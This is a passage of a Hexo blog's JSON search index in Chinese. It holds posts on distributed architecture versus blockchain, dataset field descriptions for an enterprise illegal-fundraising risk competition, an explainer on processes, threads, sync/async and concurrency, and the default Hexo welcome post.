3.可靠性强（即是单个服务宕机了，其它服务也能正常运行） 缺点 1.可靠性差 2.维护成本高 3.吞吐量小 1.对技术要求高 2.人力成本大 3.资源要求大 总的来说区块链与分布式的联系并不是很大，但区块链使用了分布式架构的想法，实现去中心化，把每个用户都当作一个体，各自可为中心，而分布式则是面向的服务，把服务细分，各管各的。（更多关于区块链的可以去了解传说中的比特币） 参考链接：https://blog.csdn.net/weixin_45393094/article/details/104632343 https://zhuanlan.zhihu.com/p/22228902 https://blog.csdn.net/zhonglunsheng/article/details/83153451","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"基本信息","slug":"competition","date":"2020-10-15T13:43:35.000Z","updated":"2020-10-15T13:52:04.016Z","comments":true,"path":"2020/10/15/competition/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/10/15/competition/","excerpt":"","text":"数据集1：base_info.csv 标签 类别 id 企业唯一标识 oplocdistrict 行政区划代码 industryphy 行业类别代码 industryco 行业细类代码 dom 经营地址 opscope 经营范围 enttype 企业类型 enttypeitem 企业类型小类 opfrom 经营期限起 opto 经营期限止 state 状态 orgid 机构标识 jobid 职位标识 adbusign 是否广告经营 townsign 是否城镇 regtype 主题登记类型 empnum 从业人数 compform 组织形式 parnum 合伙人数 exenum 执行人数 opform 经营方式 ptbusscope 兼营范围 venind 风险行业 enttypeminu 企业类型细类 midpreindcode 中西部优势产业代码 protype 项目类型 oploc 经营场所 regcap 注册资本（金） reccap 实缴资本 forreccap 实缴资本（外方） forregcap 注册资本（外方） congro 投资总额 enttypegb 企业（机构）类型 数据集2：annual_report_info.csv1234567891011121314151617181920212223id 企业唯一标识ANCHEYEAR 年度STATE 状态FUNDAM 资金数额MEMNUM 成员人数FARNUM 农民人数ANNNEWMEMNUM 本年度新增成员人数ANNREDMEMNUM 本年度退出成员人数EMPNUM 从业人数EMPNUMSIGN 从业人数是否公示BUSSTNAME 经营状态名称COLGRANUM 其中高校毕业生人数经营者RETSOLNUM 其中退役士兵人数经营者DISPERNUM 其中残疾人人数经营者UNENUM 其中下岗失业人数经营者COLEMPLNUM 其中高校毕业生人数雇员RETEMPLNUM 其中退役士兵人数雇员DISEMPLNUM 其中残疾人人数雇员UNEEMPLNUM 其中下岗失业人数雇员WEBSITSIGN 是否有网站标志FORINVESTSIGN 是否有对外投资企业标志STOCKTRANSIGN 有限责任公司本年度是否发生股东股权转让标志PUBSTATE 公示状态：1 全部公示，2部分公示,3全部不公示 数据集3：tax_info.csv123456789id 企业唯一标识START_DATE 起始时间END_DATE 终止时间TAX_CATEGORIES 税种TAX_ITEMS 税目TAXATION_BASIS 计税依据TAX_RATE 税率DEDUCTION 扣除数TAX_AMOUNT 税额 数据集4：change_info.csv12345id 企业唯一标识bgxmdm 变更信息代码bgq 变更前bgh 变更后bgrq 变更日期 数据集5：news_info.csv123id 企业唯一标识positive_negtive 新闻正负面性public_date 发布日期 数据集6：other_info.csv1234id 企业唯一标识 legal_judgment_num 裁判文书数量brand_num 注册商标数量patent_num 专利数量 数据集7：entprise_info.csv带标注的企业数据。每一行代表一个企业，每一行2列，其中id列为企业唯一标识，label列为标注（1：有非法集资风险，0：无非法集资风险），列之间采用“,”分隔符分割 数据集8（验证集）：entprise_evaluate.csv每一行代表一个企业，每一行有 2 列, 其中id列为企业唯一标识，score列为空，列之间采用“,”分隔符分割 如： id score 82750f1b9d1223508ee329d47e27d35176c93eb9f35e9c1a 0.0001 f000950527a6feb670cc1c87c2025f3922aaa4a0206a0a33 0.0002 e9f7b28ec10e04700ef4db75a494f9a1e8e8b09555e6afa1 0.0003 beb4aaaa89e0a0ae9d77bd5d7665be6342f552f51840cf19 0.0004 e9f7b28ec10e0470ee4172cec0133b6826c34f27d3dff204 0.0005 d8071a739aa75a3ba10ae8205ae3c7b267bdbe32cd6cb582 0.0006 f000950527a6feb63dcc53f7fc8ccac0eb92d37b34f18854 0.0007 4a8fc4f3fb4d8a0ff806928b39e9b5e776d9b0d2d32bce0a 0.0008 f000950527a6feb678e9430f14270a010ec5e747a694829a 0.0009 d8071a739aa75a3bb4ea6cf0f8ce3b13082101f40a426037 0.001 8f19388cfd6e2b9c1245cd2b699345995d8983b74a3e1f98 0.0011 da8691b210adb3f650c6cf12438085a7b6a3fa62e4806333 0.0012 da8691b210adb3f62d73891e5769ab06c8bfad96fa50778f 0.0013 f000950527a6feb6dc5fea352959ce7a91b1a31843cc2042 0.0014 f000950527a6feb655bd97953a1686480289fcb12ab193f0 0.0015 516ab81418ed215dbf53c2d4e3d8e4c41e3ded65e5488128 0.0016 beb4aaaa89e0a0ae25ca69a05a0a98b61b6904fba82af3c1 0.0017","categories":[{"name":"比赛","slug":"比赛","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"信息分析","slug":"信息分析","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/"}]},{"title":"浅谈进程与协程、异步与同步、并发与并行","slug":"infomal","date":"2020-10-14T13:35:35.000Z","updated":"2020-10-14T13:54:38.688Z","comments":true,"path":"2020/10/14/infomal/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/10/14/infomal/","excerpt":"","text":"今天偶然看到异步和同步的文章，联想到了进程，线程这些。下面，我来浅谈一下进程、线程、异步和同步 进程和线程进程 一个程序的执行过程，是一个Windows系统中的一个动态的概念，包含了一个线程或多个线程。 每一个进程的都有自己的空间地址，内存不共享 一个进程至少有5种基本状态，分别是：初始态，执行态，等待状态，就绪状态，终止状态。 线程 CPU调度的和分配的基本单位 它可与同属的一个进程的多个线程共享资源 这里补充一点，协程(gorutine)是依赖于线程来管理的，就对GO语言而说，因为我们能直接管理线程，便通过协程来调度，实现其百万并发 进程和线程的区别 进程 线程 基本单元 资源分配的基本单元 cpu调度的基本单元 关于资源 不能共享 同一进程的线程可共享 创建与切换的开销 大 小 同步(Sync)和异步(Async)同步概念：在执行一个事件的时候，没有得到返回结果前，就不会继续往下执行 换句话来说：就是按顺序一件一件事情的做，只能等前一件事情做完了才能往下继续 举个例子 有个人头铁，提交了作业后，非要等评分出了，才去干其它事情 异步概念：与同步相对，在执行一个事件的时候，即是没有得到返回结果，也可以继续往下执行。但这里要注意的是当调用完成后，一般是通过状态、通知和回调来通知调用者的，并且调用的返回不再受调用者控制（这里可以联系到js的回调函数，具体我就不说） 举个​例子:后来，这个人变聪明，提交作业后，就不管了，去干其它事情了 同步和异步的区别总的来说，同步和异步的区别就是在于是否需要等待结果的返回 并发和并行并发 概念：在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行，但任一个时刻点上只有一个程序在处理机上运行。 这里需要补充的是，当多个线程在一个cpu上运行的时候，实际上也不是同时运行的，cpu只是将时间划分成多个时间段，然后分配给各个线程。当一个线程在运行的时候，其它线程处于阻塞状态 还是举个例子：当你在吃饭的时候，电话打来了，你就去接电话了，接完了回来再继续吃饭 并行 概念：当系统有一个以上CPU时，则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel) 简而言之，就是同时进行，举个例子：你在吃饭，电话来了，然后你边吃饭边接电话 并发与并行的总结并发主要的是 排队、等待、执行。 并行则时同时执行。 参考连接： https://www.cnblogs.com/mhq-martin/p/9035640.html https://www.cnblogs.com/linguanh/p/11629828.html","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-10-04T05:43:12.009Z","updated":"2020-10-04T05:43:12.009Z","comments":true,"path":"2020/10/04/hello-world/","link":"","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/2020/10/04/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E4%BD%9C%E4%B8%9A/"},{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"},{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E9%9A%8F%E7%AC%94/"},{"name":"比赛","slug":"比赛","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/categories/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/JAVA/"},{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/web%E6%94%BB%E5%87%BB/"},{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E6%9E%B6%E6%9E%84/"},{"name":"信息分析","slug":"信息分析","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/"},{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/z-anshun.github.io/tree/master/tags/%E5%9F%BA%E7%A1%80/"}]}